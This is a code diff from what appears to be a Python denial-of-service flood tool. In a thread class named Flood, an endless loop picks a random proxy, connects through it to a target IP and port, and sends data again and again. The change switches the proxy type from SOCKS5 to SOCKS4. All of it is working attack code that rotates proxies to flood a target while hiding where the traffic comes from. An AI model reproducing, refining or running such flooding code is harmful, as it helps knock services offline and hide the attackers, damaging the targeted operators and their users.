@@ -113,7 +113,7 @@ class Flood(threading.Thread):
                     while True:
                         try:
                             proxy = random.choice(proxies).strip().split(":")
-                            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+                            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
                             s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                             s.connect((ip, port))
                             s.send(str.encode(data_data))
